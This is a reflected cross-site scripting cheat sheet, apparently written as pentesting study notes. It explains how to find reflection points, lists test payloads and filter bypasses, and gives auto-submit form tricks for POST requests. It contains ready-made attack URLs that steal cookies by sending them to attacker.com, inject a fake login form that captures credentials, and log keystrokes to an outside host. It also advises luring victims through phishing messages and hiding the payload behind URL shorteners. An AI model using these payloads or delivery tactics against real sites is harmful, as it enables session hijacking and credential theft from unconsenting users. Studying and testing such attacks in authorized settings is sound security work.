# Reflected XSS Quick Reference

## What is Reflected XSS?

**Reflected XSS** = Payload reflected back in response immediately (non-persistent)

**Characteristics**:
- ❌ NOT stored in database
- ❌ NOT permanent
- ✅ Executes immediately
- ✅ Affects only targeted user
- ✅ Delivered via malicious URL

## Key Difference: Stored vs Reflected

| Feature | Stored | Reflected |
|---------|--------|-----------|
| **Storage** | Database | None |
| **Persistence** | ✅ Permanent | ❌ Temporary |
| **Victims** | All users | Targeted user |
| **Delivery** | Automatic | Malicious link |
| **Severity** | Critical | High |

## Common Vulnerable Locations

- Error messages
- Search results
- URL parameters
- Form feedback
- 404 pages
- Confirmation messages
- User input echoed back

## Basic Test Payload

```html
<script>alert(window.origin)</script>
```

## Testing Process

### 1. Find reflection point
```
Input: test
Output: "Error: test not found"
```

### 2. Inject payload
```html
<script>alert(1)</script>
```

### 3. Check execution
- Alert pops = Vulnerable ✅
- No alert = Filtered ❌

### 4. Verify non-persistence
- Refresh page
- Payload gone = Reflected XSS
- Payload persists = Stored XSS

## Identify via Developer Tools

```bash
# Open DevTools (CTRL+SHIFT+I)
# Network tab
# Submit payload
# Check request type:
# - GET = URL-based (easy to weaponize)
# - POST = Body-based (harder to weaponize)
```

## GET Request Exploitation

### Typical Vulnerable URL
```
http://target.com/search?q=<script>alert(1)</script>
```

### Attack Flow
```
1. Craft malicious URL
   ↓
2. Send to victim (phishing)
   ↓
3. Victim clicks link
   ↓
4. Payload executes in victim's browser
```

## Weaponizing Reflected XSS

### Step 1: Test vulnerability
```html
http://target.com/error?msg=test
Output: Error: test
```

### Step 2: Inject payload
```html
http://target.com/error?msg=<script>alert(1)</script>
Output: Alert box pops
```

### Step 3: Copy malicious URL
```
Right-click Network request → Copy → Copy URL
OR
Copy from browser address bar
```

### Step 4: Send to victim
```
Email: "Check out this error: [malicious URL]"
Message: "Look at this search result: [malicious URL]"
```

## URL-Based Payloads

### Basic
```
?search=<script>alert(1)</script>
```

### URL Encoded
```
?search=%3Cscript%3Ealert(1)%3C/script%3E
```

### Double Encoded
```
?search=%253Cscript%253Ealert(1)%253C/script%253E
```

## Common Test Payloads

```html
<!-- Alert box -->
<script>alert(document.domain)</script>

<!-- Show cookies -->
<script>alert(document.cookie)</script>

<!-- Image tag -->
<img src=x onerror=alert(1)>

<!-- SVG -->
<svg onload=alert(1)>

<!-- Body tag -->
<body onload=alert(1)>

<!-- iFrame -->
<iframe src=javascript:alert(1)>
```

## POST Request Exploitation

### Harder to exploit (requires form submission)

#### Method 1: Auto-submit form
```html
<html>
<body>
<form id="xss" action="http://target.com/submit" method="POST">
  <input type="hidden" name="comment" value="<script>alert(1)</script>">
</form>
<script>document.getElementById('xss').submit()</script>
</body>
</html>
```

#### Method 2: CSRF
```html
<form action="http://target.com/submit" method="POST">
  <input name="msg" value="<script>alert(1)</script>">
</form>
```

## Finding Reflected XSS

### Manual Testing
```bash
# 1. Find input fields/parameters
# 2. Enter test string
test123xyz

# 3. Search page source (CTRL+U)
# Look for: test123xyz

# 4. If found, inject XSS
<script>alert(1)</script>
```

### Common Parameters
```
?q=
?search=
?query=
?keyword=
?msg=
?error=
?message=
?name=
?user=
?id=
?page=
```

## Verification Checklist

✅ **Reflected XSS if**:
- Input echoed in response
- Payload executes immediately
- Gone after page refresh
- Not in database
- Works via URL/request

## Real-World Example

```
Vulnerable URL:
http://site.com/search?q=shoes

Test:
http://site.com/search?q=<script>alert(1)</script>

Result: Alert pops

Exploit:
http://site.com/search?q=<script>
fetch('http://attacker.com/steal?c='+document.cookie)
</script>

Send victim this URL → Steal their cookies
```

## Attack Scenarios

### Scenario 1: Cookie Theft
```html
http://target.com?search=<script>
document.location='http://attacker.com/?c='+document.cookie
</script>
```

### Scenario 2: Phishing
```html
http://target.com?msg=<script>
document.body.innerHTML='<h1>Login</h1><form action=http://attacker.com/phish>
<input name=user><input name=pass type=password><input type=submit></form>'
</script>
```

### Scenario 3: Keylogger
```html
http://target.com?error=<script>
document.onkeypress=function(e){
fetch('http://attacker.com/log?k='+e.key)
}
</script>
```

## URL Shortening (Hide Payload)

```bash
# Long malicious URL
http://site.com/search?q=<script>alert(1)</script>

# Shorten with bit.ly, tinyurl, etc.
https://bit.ly/abc123

# Looks innocent to victim
```

## Detection Methods

### Check page source
```html
<!-- Look for your input unencoded -->
<div>Search results for: <script>alert(1)</script></div>
```

### Check Network tab
```
Request: GET /search?q=<script>alert(1)</script>
Response: Contains <script>alert(1)</script>
```

### Developer Console
```javascript
// Errors indicate XSS attempt
Uncaught SyntaxError: Unexpected token '<'
```

## Tools

```bash
# Manual
curl "http://target.com/search?q=<script>alert(1)</script>"

# Automated
xsstrike -u "http://target.com/search?q=test"
dalfox url http://target.com/search?q=test

# Burp Suite
# Spider → Find parameters
# Intruder → Fuzz with XSS payloads
```

## Bypass Techniques

```html
<!-- If <script> blocked -->
<img src=x onerror=alert(1)>

<!-- If alert() blocked -->
<script>confirm(1)</script>
<script>prompt(1)</script>

<!-- If quotes blocked -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- HTML entities -->
&lt;script&gt;alert(1)&lt;/script&gt;
```

## Quick Test Command

```bash
# GET parameter
curl "http://target.com/page?param=<script>alert(1)</script>"

# Check if payload in response
curl "http://target.com/page?param=TEST123" | grep "TEST123"
```

## Key Points

🔴 **Remember**:
- Reflected = Temporary (not stored)
- Requires victim to click link
- Common in search/error pages
- GET requests easiest to exploit
- URL shorteners hide payload

🟢 **Attack Vector**:
```
Attacker → Crafts URL → Sends to victim → Victim clicks → XSS executes
```

## Impact

**High** because:
- ✅ Cookie theft
- ✅ Session hijacking
- ✅ Credential harvesting
- ✅ Phishing attacks
- ✅ Malware distribution

**But Less Than Stored** because:
- ❌ Requires social engineering
- ❌ Only affects targeted user
- ❌ Not automatic
